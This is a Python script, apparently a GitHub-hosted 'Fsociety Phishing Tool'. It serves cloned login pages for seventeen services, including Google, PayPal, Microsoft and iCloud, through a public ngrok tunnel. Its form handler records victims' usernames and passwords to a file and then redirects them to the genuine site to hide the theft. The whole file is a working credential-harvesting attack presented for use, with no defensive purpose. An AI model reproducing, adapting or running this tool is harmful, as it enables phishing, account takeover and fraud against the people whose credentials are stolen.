# Malware Coder: Elliot Alderson
# GitHub: https://github.com/ElliotAlderson51
# Fsociety Phishing Tool - using ngrok
from flask import Flask, render_template, url_for, request, redirect
from flask_sqlalchemy import SQLAlchemy
from pyngrok import ngrok
from colored import fg, attr
import time
import sys
import os

blue = fg("blue")
green = fg("green")
red = fg("red")
reset = attr("reset")

page = ""
myFolder = ""

def install_req():
  os.system('pip install colored, pyngrok, flask')

print(red + """ 
  _____               _      _           ____  _     _     _     _             
 |  ___|__  ___   ___(_) ___| |_ _   _  |  _ \| |__ (_)___| |__ (_)_ __   __ _ 
 | |_ / __|/ _ \ / __| |/ _ \ __| | | | | |_) | '_ \| / __| '_ \| | '_ \ / _` |
 |  _|\__ \ (_) | (__| |  __/ |_| |_| | |  __/| | | | \__ \ | | | | | | | (_| |
 |_|  |___/\___/ \___|_|\___|\__|\__, | |_|   |_| |_|_|___/_| |_|_|_| |_|\__, |
                                 |___/                                   |___/ 
 
""" + reset, end =" ")

print(blue + "@" + reset + "*****************************************************************************" + blue + "@" + reset)


if page == "":
    print("\t\t\t  ----------------------")
    print("\t\t\t |  " + blue + "[" + reset + "01" + blue + "]" + red + " Instagram" + reset + "     |")
    print("\t\t\t |  " + blue + "[" + reset + "02" + blue + "]" + red + " Google" + reset + "        |")
    print("\t\t\t |  " + blue + "[" + reset + "03" + blue + "]" + red + " Facebook" + reset + "      |")
    print("\t\t\t |  " + blue + "[" + reset + "04" + blue + "]" + red + " GitHub" + reset + "        |")
    print("\t\t\t |  " + blue + "[" + reset + "05" + blue + "]" + red + " Linkedin" + reset + "      |")
    print("\t\t\t |  " + blue + "[" + reset + "06" + blue + "]" + red + " PayPal" + reset + "        |")
    print("\t\t\t |  " + blue + "[" + reset + "07" + blue + "]" + red + " Quora" + reset + "         |")
    print("\t\t\t |  " + blue + "[" + reset + "08" + blue + "]" + red + " Spotify" + reset + "       |" + "\t\tFuck Society")
    print("\t\t\t |  " + blue + "[" + reset + "09" + blue + "]" + red + " Twitter" + reset + "       |")
    print("\t\t\t |  " + blue + "[" + reset + "10" + blue + "]" + red + " Steam" + reset + "         |")
    print("\t\t\t |  " + blue + "[" + reset + "11" + blue + "]" + red + " Amazon" + reset + "        |")
    print("\t\t\t |  " + blue + "[" + reset + "12" + blue + "]" + red + " Tumblr" + reset + "        |")
    print("\t\t\t |  " + blue + "[" + reset + "13" + blue + "]" + red + " Pinterest" + reset + "     |")
    print("\t\t\t |  " + blue + "[" + reset + "14" + blue + "]" + red + " Microsoft" + reset + "     |")
    print("\t\t\t |  " + blue + "[" + reset + "15" + blue + "]" + red + " ProtonMail" + reset + "    |")
    print("\t\t\t |  " + blue + "[" + reset + "16" + blue + "]" + red + " Yahoo!" + reset + "        |")
    print("\t\t\t |  " + blue + "[" + reset + "17" + blue + "]" + red + " iCloud" + reset + "        |")
    print("\t\t\t  ----------------------")
    print(blue + "@" + reset + "*****************************************************************************" + blue + "@" + reset)

    page = input("[*] Choose an option> ")

if page == "1":
    page = "instagram"
    myFolder = "InstagramPhishing"
elif page == "2":
    page = "google"
    myFolder = "GooglePhishing"
elif page == "3":
    page = "facebook"
    myFolder = "FacebookPhishing"
elif page == "4":
    page = "github"
    myFolder = "GitHubPhishing"
elif page == "5":
    page = "linkedin"
    myFolder = "LinkedinPhishing"
elif page == "6":
    page = "paypal"
    myFolder = "PayPalPhishing"
elif page == "7":
    page = "quora"
    myFolder = "QuoraPhishing"
elif page == "8":
    page = "spotify"
    myFolder = "SpotifyPhishing"
elif page == "9":
    page = "twitter"
    myFolder = "TwitterPhishing"
elif page == "10":
    page = "steam"
    myFolder = "SteamPhishing"
elif page == "11":
    page = "amazon"
    myFolder = "AmazonPhishing"
elif page == "12":
    page = "tumblr"
    myFolder = "TumblrPhishing"
elif page == "13":
    page = "pinterest"
    myFolder = "PinterestPhishing"
elif page == "14":
    page = "microsoft"
    myFolder = "MicrosoftPhishing"
elif page == "15":
    page = "protonmail"
    myFolder = "ProtonMailPhishing"
elif page == "16":
    page = "yahoo"
    myFolder = "YahooPhishing"
elif page == "17":
    page = "icloud"
    myFolder = "iCloudPhishing"
else:
    print(red + "[-]" + reset + " Invalid Choice..... Try Again")
    sys.exit()

try:
    os.mkdir(myFolder)
except:
    pass

app = Flask(__name__)

@app.route('/', methods=['POST', 'GET'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        print(green + "--------------------------" + reset)
        print(green + "[+] " + reset + "UserName: " + username)
        print(green + "[+] " + reset + "Password: " + password)
        print(green + "--------------------------" + reset)

        if username != "" and password != "":
            with open(myFolder + "/account.txt", "a") as f:
                f.write("--------" + page + "--------\n\nUserName: " + username + "\nPassword: " + password + "\n\n--------" + page + "--------\n\n")
            if page == "steam":
                return redirect('https://store.steampowered.com')
            else:
                return redirect('https://' + page + '.com')
            
        return redirect('/')
    else:
        return render_template(page + "/" + page + '.html')

if __name__ == "__main__":
    install_req()
    url = ngrok.connect(5000, "http")
    url = str(url).replace("http", "https")
    print(url)
    app.run(debug=False)
